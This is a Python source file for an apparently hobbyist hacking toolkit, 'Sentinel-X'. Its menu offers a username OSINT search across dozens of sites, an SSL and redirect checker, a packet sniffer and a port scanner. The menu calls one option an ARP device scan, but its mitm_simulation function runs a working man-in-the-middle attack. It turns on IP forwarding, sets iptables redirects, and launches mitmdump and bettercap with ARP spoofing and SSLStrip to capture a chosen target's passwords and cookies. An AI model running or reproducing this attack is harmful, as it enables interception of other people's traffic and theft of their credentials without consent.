import sys
import time
import socket
import threading
import requests
import ssl
import os
import random
from datetime import datetime
from colorama import Fore, Back, Style, init
import pyttsx3
import subprocess
import shutil
import signal

try:
    from scapy.all import sniff, ARP, Ether, srp, conf
    conf.verb = 0 
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
init(autoreset=True)
engine = pyttsx3.init()
engine.setProperty('rate', 160) 
engine.setProperty('volume', 1.0)

def speak(text):
    try:
        engine.say(text)
        engine.runAndWait()
    except: pass

def log(text, level="INFO"):
    t = datetime.now().strftime("%H:%M:%S")
    colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ALERT": Fore.RED, "WARN": Fore.YELLOW}
    print(f"{Fore.WHITE}[{t}] {colors[level]}[{level}] {Fore.WHITE}{text}")

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = r"""
    ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗          ██╗  ██╗
    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║          ╚██╗██╔╝
    ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║           ╚███╔╝ 
    ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║           ██╔██╗ 
    ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗██╗ ██╔╝  ██╗
    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝ ╚═╝   ╚═╝
                                            [ Powered by: CyberOps ]
    """
    print(Fore.CYAN + Style.BRIGHT + logo)
    speak("Sentinel X interface loaded.")

# --------------------------------------------------- 1. REAL OSINT TRACKER  ---------------------------------------------------------------------
def osint_tracker():
    speak("Global OSINT Tracker initialized.")
    target = input(Fore.WHITE + "\nroot@sentinel:~/osint# Target Username: ")
    
    print(Fore.CYAN + "\n[*] Initializing Search Threads for 30+ Platforms...")
    print(Fore.CYAN + "[*] Please wait, checking databases...\n")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    sites = {
        "GitHub": f"https://github.com/{target}",
        "Instagram": f"https://www.instagram.com/{target}",
        "Facebook": f"https://www.facebook.com/{target}",
        "Twitter": f"https://www.twitter.com/{target}",
        "YouTube": f"https://www.youtube.com/{target}",
        "Blogger": f"https://{target}.blogspot.com",
        "GooglePlus": f"https://plus.google.com/+{target}/posts",
        "Reddit": f"https://www.reddit.com/user/{target}",
        "Wordpress": f"https://{target}.wordpress.com",
        "Pinterest": f"https://www.pinterest.com/{target}",
        "Github": f"https://www.github.com/{target}",
        "Tumblr": f"https://{target}.tumblr.com",
        "Flickr": f"https://www.flickr.com/photos/{target}",
        "Steam": f"https://steamcommunity.com/id/{target}",
        "Vimeo": f"https://vimeo.com/{target}",
        "SoundCloud": f"https://soundcloud.com/{target}",
        "Disqus": f"https://disqus.com/{target}",
        "Medium": f"https://medium.com/@{target}",
        "DeviantART": f"https://{target}.deviantart.com",
        "VK": f"https://vk.com/{target}",
        "About.me": f"https://about.me/{target}",
        "Spotify": f"http://googleusercontent.com/spotify.com/{target}",
        "MixCloud": f"https://www.mixcloud.com/{target}",
        "Scribd": f"https://www.scribd.com/{target}",
        "Badoo": f"https://www.badoo.com/en/{target}",
        "Patreon": f"https://www.patreon.com/{target}",
        "BitBucket": f"https://bitbucket.org/{target}",
        "CashMe": f"https://cash.me/{target}",
        "Behance": f"https://www.behance.net/{target}",
        "GoodReads": f"https://www.goodreads.com/{target}",
        "Instructables": f"https://www.instructables.com/member/{target}",
        "Keybase": f"https://keybase.io/{target}",
        "Kongregate": f"https://kongregate.com/accounts/{target}",
        "LiveJournal": f"https://{target}.livejournal.com",
        "AngelList": f"https://angel.co/{target}",
        "last.fm": f"https://last.fm/user/{target}",
        "Dribbble": f"https://dribbble.com/{target}",
        "Codecademy": f"https://www.codecademy.com/{target}",
        "Gravatar": f"https://en.gravatar.com/{target}",
        "Pastebin": f"https://pastebin.com/u/{target}",
        "Foursquare": f"https://foursquare.com/{target}",
        "Roblox": f"https://www.roblox.com/user.aspx?username={target}",
        "Gumroad": f"https://www.gumroad.com/{target}",
        "Newgrounds": f"https://{target}.newgrounds.com",
        "Wattpad": f"https://www.wattpad.com/user/{target}",
        "Canva": f"https://www.canva.com/{target}",
        "CreativeMarket": f"https://creativemarket.com/{target}",
        "Trakt": f"https://www.trakt.tv/users/{target}",
        "500px": f"https://500px.com/{target}",
        "Buzzfeed": f"https://buzzfeed.com/{target}",
        "TripAdvisor": f"https://tripadvisor.com/members/{target}",
        "HubPages": f"https://{target}.hubpages.com/",
        "Contently": f"https://{target}.contently.com",
        "Houzz": f"https://houzz.com/user/{target}",
        "blip.fm": f"https://blip.fm/{target}",
        "Wikipedia": f"https://www.wikipedia.org/wiki/User:{target}",
        "HackerNews": f"https://news.ycombinator.com/user?id={target}",
        "CodeMentor": f"https://www.codementor.io/{target}",
        "ReverbNation": f"https://www.reverbnation.com/{target}",
        "Designspiration": f"https://www.designspiration.net/{target}",
        "Bandcamp": f"https://www.bandcamp.com/{target}",
        "ColourLovers": f"https://www.colourlovers.com/love/{target}",
        "IFTTT": f"https://www.ifttt.com/p/{target}",
        "Ebay": f"https://www.ebay.com/usr/{target}",
        "Slack": f"https://{target}.slack.com",
        "OkCupid": f"https://www.okcupid.com/profile/{target}",
        "Trip": f"https://www.trip.skyscanner.com/user/{target}",
        "Ello": f"https://ello.co/{target}",
        "Tracky": f"https://tracky.com/~{target}",
        "Tripit": f"https://www.tripit.com/people/{target}#/profile/basic-info",
        "Basecamp": f"https://{target}.basecamphq.com/login",
        "BugCrowd": f"https://bugbrowd.com/h/{target}",
        "Hackerone": f"https://hackerone.com/profile/{target}"
    }

    found_list = []

    def check_site(site, url):
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code == 200:
                print(Fore.GREEN + f"[+] DETECTED: {site:<15} -> {url}")
                found_list.append(site)
            elif r.status_code == 404:
                pass
        except:
            pass
    threads = []
    for site, url in sites.items():
        t = threading.Thread(target=check_site, args=(site, url))
        threads.append(t)
        t.start()
    
    for t in threads: t.join()

    print(Fore.CYAN + "----------------------------------------------------")
    if found_list:
        speak(f"Scan complete. Found {len(found_list)} accounts.")
        print(Fore.YELLOW + f"[*] SUMMARY: Target found on {len(found_list)} platforms.")
    else:
        speak("No accounts found.")
        print(Fore.RED + "[!] No matches found. Target may be using privacy settings.")

# --- 2. REAL PHISHING DETECTOR ---
def phishing_check():
    speak("Phishing Detector active.")
    url = input(Fore.WHITE + "\nroot@sentinel:~/phish# Enter URL: ")
    if not url.startswith("http"): url = "https://" + url

    try:
        r = requests.get(url, timeout=5)
        if len(r.history) > 0:
            log(f"Redirect Chain Detected ({len(r.history)} hops)", "WARN")
            for resp in r.history:
                print(Fore.YELLOW + f"    -> {resp.url} [{resp.status_code}]")
        
        hostname = url.split("//")[-1].split("/")[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print(Fore.GREEN + f"[+] SSL VALID: {cert['issuer'][1][0][1]}")
                print(Fore.GREEN + f"[+] EXPIRES  : {cert['notAfter']}")
                speak("Site certificate is valid.")

    except Exception as e:
        print(Fore.RED + f"[!] SECURITY ALERT: {e}")

# ------------------------------------------------------ 3. REAL WEB RECON -----------------------------------------------------------------
def web_pentest():
    speak("Web Recon initiated.")
    speak("Web Reconnaissance Mode.")
    speak("Engaging Advanced Web Reconnaissance Module.")
    print(Fore.CYAN + "\n[*] LOADING EXTERNAL MODULE: RECON.PY ...")
    time.sleep(1)
    
    try:
        # Run recon.py and wait untill it completes its work
        subprocess.run([sys.executable, "recon.py"]) 
        
    except FileNotFoundError:
        print(Fore.RED + "\n[!] CRITICAL ERROR: 'recon.py' not found in the same directory!")
        speak("Error. Recon module missing.")
    
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Module execution interrupted by user.")
        
    except Exception as e:
        print(Fore.RED + f"\n[!] UNEXPECTED ERROR: {e}")
        
    
    # Return To Main File
    print(Fore.GREEN + "\n[*] RETURNING TO SENTINEL-X KERNEL...")
    time.sleep(1)
    speak("Web recon module deactivated. Returning to main menu.")

# --------------------------------------------------------------------- 4. REAL NETWORK SNIFFER (SCAPY) -----------------------------------------------------------
def network_sniffer():
    if not SCAPY_AVAILABLE:
        log("Scapy not installed. Run 'pip install scapy'.", "ERROR"); return

    speak("Sniffer activated. Capturing packets.")
    print(Fore.CYAN + "\n[*] INTERCEPTING TRAFFIC (CTRL+C to Stop)...")
    
    def packet_callback(packet):
        if packet.haslayer(ARP):
            print(Fore.MAGENTA + f"[ARP] Who has {packet[ARP].pdst}? Tell {packet[ARP].psrc}")
        elif packet.haslayer(p := "TCP") or packet.haslayer(p := "UDP"):
            ip = packet["IP"]
            print(Fore.GREEN + f"[{p}] {ip.src} -> {ip.dst} : {len(packet)} bytes")

    try:
        sniff(prn=packet_callback, count=25)
        speak("Capture buffer full. Stopping.")
    except PermissionError:
        log("Run as Administrator to sniff packets!", "ERROR")

# ------------------------------------------------------------------- 5. REAL ARP NETWORK SCANNER (Replaces Fake MITM) ----------------------------------------------------
## --- CORE UTILITY: TOOL CHECK ---
def check_dependencies():
    essential_tools = ["bettercap", "mitmdump", "iptables"]
    missing = [tool for tool in essential_tools if not shutil.which(tool)]
    return missing

def mitm_simulation():
    missing = check_dependencies()
    if missing:
        log(f"Missing tools: {', '.join(missing)}. Install them first!", "ALERT")
        return

    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
    print(f"{Fore.WHITE}   SENTINEL-X ELITE   |   INTERNAL NETWORK EXPLOITATION V3.0")
    print(f"{Fore.RED}" + "═"*65)

    try:
        ifaces = os.listdir('/sys/class/net/')
        print(f"{Fore.YELLOW}[*] Available Interfaces:")
        for i, iface in enumerate(ifaces):
            print(f"    {Fore.CYAN}[{i}] {Fore.WHITE}{iface}")
        
        if_choice = int(input(f"\n{Fore.YELLOW}Select Interface ID: {Fore.WHITE}"))
        interface = ifaces[if_choice]

        log(f"Broadcasting ARP on {interface}...", "INFO")
        from scapy.all import ARP, Ether, srp
        net_prefix = ".".join(os.popen("hostname -I").read().split()[0].split(".")[:-1]) + ".0/24"
        print(f"{Fore.CYAN}[?] Scanning default range: {net_prefix}")
        
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_prefix), timeout=3, iface=interface, verbose=False)
        
        devices = []
        print(f"\n{Fore.MAGENTA}ID\tIP ADDRESS\t\tMAC ADDRESS")
        for i, (s, r) in enumerate(ans):
            devices.append(r.psrc)
            print(f"{Fore.GREEN}{i}\t{r.psrc:<15}\t{Fore.WHITE}{r.hwsrc}")
        
        target_idx = int(input(f"\n{Fore.YELLOW}Select Target ID: {Fore.WHITE}"))
        target_ip = devices[target_idx]
        gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP: {Fore.WHITE}")

    except Exception as e:
        log(f"Setup Error: {e}", "ERROR")
        return
    log_folder = "sentinel_vault"
    if not os.path.exists(log_folder): os.makedirs(log_folder)
    
    session_id = datetime.now().strftime("%H%M%S")
    pcap_out = f"{log_folder}/session_{session_id}.pcap"
    cred_out = f"{log_folder}/creds_{session_id}.txt"
    try:
        speak("Initializing elite interception engines.")
        log("Hardening Network Configuration...", "INFO")
        
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("iptables -t nat -F") 
        
        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080")

        mitm_proc = subprocess.Popen(
            ["mitmdump", "--mode", "transparent", "--save-stream", pcap_out],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Launching Bettercap (with SSLStrip & ARP Spoof)
        # SSLStrip bettercap mein 'http.proxy' se handle hota hai
        better_cmd = [
            "bettercap", "-iface", interface, "-eval", 
            f"set arp.spoof.targets {target_ip}; set http.proxy.sslstrip true; arp.spoof on; net.sniff on"
        ]
        better_proc = subprocess.Popen(better_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(3)

        # 5. DASHBOARD UI
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
        print(f"{Fore.WHITE}   STRIKE STATUS: {Fore.GREEN}RUNNING")
        print(f"{Fore.RED}" + "═"*65)
        print(f"{Fore.YELLOW} TARGET   : {Fore.WHITE}{target_ip}")
        print(f"{Fore.YELLOW} INTERFACE: {Fore.WHITE}{interface}")
        print(f"{Fore.YELLOW} VAULT    : {Fore.WHITE}{pcap_out}")
        print(f"{Fore.YELLOW} SSLSTRIP : {Fore.GREEN}ENABLED")
        print(f"{Fore.RED}" + "═"*65)
        
        print(f"\n{Fore.CYAN}[*] Scentinel-X is now a bridge between Target and Router.")
        print(f"{Fore.WHITE}[!] Monitoring for Clear-text Passwords & Cookies...")
        print(f"{Fore.RED}[!] Press CTRL+C to Safely Stop and Save Data.")

        

        while True:
            if mitm_proc.poll() is not None or better_proc.poll() is not None:
                log("One of the engines crashed! Emergency exit.", "ALERT")
                break

            for dot in [".  ", ".. ", "..."]:
                print(f"{Fore.MAGENTA}\r[+] SNIFFING{dot}", end="")
                time.sleep(0.5)

    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] TERMINATION SIGNAL RECEIVED.")

        better_proc.send_signal(signal.SIGINT)
        mitm_proc.send_signal(signal.SIGINT)
        time.sleep(2)
        
        better_proc.terminate()
        mitm_proc.terminate()
        log("Restoring Network Settings...", "INFO")
        os.system("iptables -t nat -F")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        
        print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════════════╗")
        print(f"║ {Fore.WHITE}SESSION ARCHIVED: {pcap_out:<33} ║")
        print(f"║ {Fore.WHITE}STATUS: All background rules cleared.                 ║")
        print(f"╚═══════════════════════════════════════════════════════╝")
        
        speak("Interception successful. Data archived in vault.")
        time.sleep(3)
        banner()

# ---------------------------------------------------------------- 6. REAL MULTI-THREADED PORT SCANNER --------------------------------------------------------------
def port_scanner():
    speak("Port Scanner initialized.")
    target = input(Fore.WHITE + "\nroot@sentinel:~/nmap# Enter Target IP: ")
    
    print(Fore.CYAN + f"\n[*] Bombarding {target} with packets...")
    
    active_ports = []

    def scan_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                sys.stdout.write(Fore.GREEN + f"\r[+] Found Open Port: {port}   \n")
                active_ports.append(port)
            s.close()
        except: pass
    threads = []
    for port in range(1, 101):
        t = threading.Thread(target=scan_port, args=(port,))
        threads.append(t)
        t.start()
    
    for t in threads: t.join()
    
    if not active_ports:
        log("No open ports found or firewall active.", "WARN")
    speak("Port scan finished.")

def main():
    
    while True:
        banner()
        print(Fore.MAGENTA + "\n--- [ SENTINEL-X COMMAND MENU ] ---")
        print(Fore.YELLOW + "1. OSINT Tracker       " + Fore.WHITE + "(Real Profile Search)")
        print(Fore.YELLOW + "2. Phishing Detector   " + Fore.WHITE + "(SSL & Redirect Analysis)")
        print(Fore.YELLOW + "3. Web Recon           " + Fore.WHITE + "(Headers & Admin Finder)")
        print(Fore.YELLOW + "4. Network Sniffer     " + Fore.WHITE + "(Live Packet Capture)")
        print(Fore.YELLOW + "5. LAN Scanner (MitM)  " + Fore.WHITE + "(ARP Device Discovery)")
        print(Fore.YELLOW + "6. Port Scanner        " + Fore.WHITE + "(Multi-threaded)")
        print(Fore.YELLOW + "7. Exit")
        
        choice = input(Fore.RED + "\nroot@sentinel:~# ")
        
        if choice == '1': osint_tracker()
        elif choice == '2': phishing_check()
        elif choice == '3': web_pentest()
        elif choice == '4': network_sniffer()
        elif choice == '5': mitm_simulation()
        elif choice == '6': port_scanner()
        elif choice == '7': 
            speak("System shutting down.")
            sys.exit()
        else:
            print(Fore.RED + "Invalid Option.")

if __name__ == "__main__": 
    main()




